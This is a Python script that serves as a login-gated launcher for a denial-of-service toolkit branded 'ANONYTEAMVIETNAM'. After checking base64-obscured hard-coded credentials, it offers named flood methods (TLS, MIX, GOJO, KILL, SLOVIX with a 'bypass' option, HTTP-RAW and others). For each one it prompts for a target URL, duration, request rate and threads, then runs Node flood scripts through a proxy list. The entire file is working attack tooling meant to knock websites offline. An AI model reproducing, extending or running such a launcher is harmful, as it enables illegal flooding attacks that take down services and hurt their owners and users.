import base64
from colorama import Fore,init
import os
from getpass import getpass
init()
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m' # orange on some systems
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
LIGHT_GRAY = '\033[37m'
DARK_GRAY = '\033[90m'
BRIGHT_RED = '\033[91m'
BRIGHT_GREEN = '\033[92m'
BRIGHT_YELLOW = '\033[93m'
BRIGHT_BLUE = '\033[94m'
BRIGHT_MAGENTA = '\033[95m'
BRIGHT_CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m' # called to return to standard terminal text color
os.system('clear')
os.system('cls')
u=base64.b64decode('YWRtaW4=').decode("utf-8")
p=base64.b64decode('YmFvQC4=').decode("utf-8")
print(GREEN+'WELCOME TO ANONYTEAMVIETNAM')
u1=getpass('USER:')
p1=getpass('PASSWORD:')
if p1==p and u1==u:
    print('PASSWORD CORRECT')
    print(BLUE+''' )    (( (   ( .  (   ((    ((   (        (  (     ( (  
(()  (\())\: )\ . )\  ))\   ))\ ())       )\ )\   )\))\ 
()(_)))(_)(_)((_) ((_)((_)))((_)((_))     ((_)(_)__(_)(_)
|   \| __|  \/  |/ _ \| \| |_ _|/ __|    / __| |/ / \ / /
| |) | _|| |\/| | (_) | .  || || (__     \__ \   < \   / 
|___/|___|_|  |_|\___/|_|\_|___|\___|    |___/_|\_\ |_|
          '''+RESET)
    methods='TLS','MIX','GOJO','GORI','KILL',"SLOVIX",'FAST','TLSX','HTTP-RAW','tls','mix','gojo','gori','kill','slovix','fast','tlsx','http-raw'
    print(RED+'METHODS:TLS')
    print('        MIX')
    print('        GOJO')
    print('        GORI')
    print('        KILL')
    print('        SLOVIX')
    print('        FAST')
    print('        TLSX')
    print('        HTTP-RAW')
    mt=input('METHOD:')
    if mt in methods:
        if mt=='TLS' or mt=='tls':
            #USE:node tls.js url time rps threads proxy list
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node StarsXTls2.js {url} {time} {rps} {thr} proxy.txt')
        if mt=='MIX' or mt=='mix':
            #USE:node mix.js url time rps threads proxy list
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node mix.js {url} {time} {rps} {thr} proxy.txt')
        if mt=='GOJO' or mt=='gojo':
            #USE:node gojo.js <target> <time> <rps> <threads> <proxy file>
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node gojo.js {url} {time} {rps} {thr} proxy.txt')
        if mt=='GORI' or mt=='gori':
            #USE:node browser.js <target> <time> <threads> <ratelimit> <proxyfile>
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node gori.js {url} {time} {thr} {rps} proxy.txt')
        if mt=='KILL' or mt=='kill':
            #USE:node browser.js <target> <time> <threads> <ratelimit> <proxyfile>
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node kill.js {url} {time} {rps} {thr} proxy.txt')
        if mt=='SLOVIX' or mt=='slovix':
            #Usage: host time req thread proxy.txt flood/bypass
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            fb=('FLOOD','BYPASS','flood','bypass')
            b=input('FLOOD OR BYPASS:')
            if b in fb or b=='':
                x=b.lower()
                os.system(f'node slovix.js {url} {time} {rps} {thr} proxy.txt {x}')
            else:
                print('FLOOD OR BYPASS NOT',b)
        if mt=='FAST' or mt=='fast':
            url=input('URL:')
            os.system(f'node fast.js {url}')
        if mt=='TLSX' or mt=='tlsx':
            #Usage: target time rate thread proxyfile
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node tlsx.js {url} {time} {rps} {thr} proxy.txt')
        if mt=='HTTP-RAW' or mt=='http-raw':
            #node HTTP-RAW.js url time
            url=input('URL:')
            time=int(input('TIME:'))
            os.system('node http-raw.js')
            os.system(f'node http-raw.js {url} {time}')
    else:
        print(Fore.RED+'WRONG METHOD')
else:
    print(Fore.RED+'YOUR USER OR PASSWORD IS INCORRECT,PLEASE TRY AGAIN')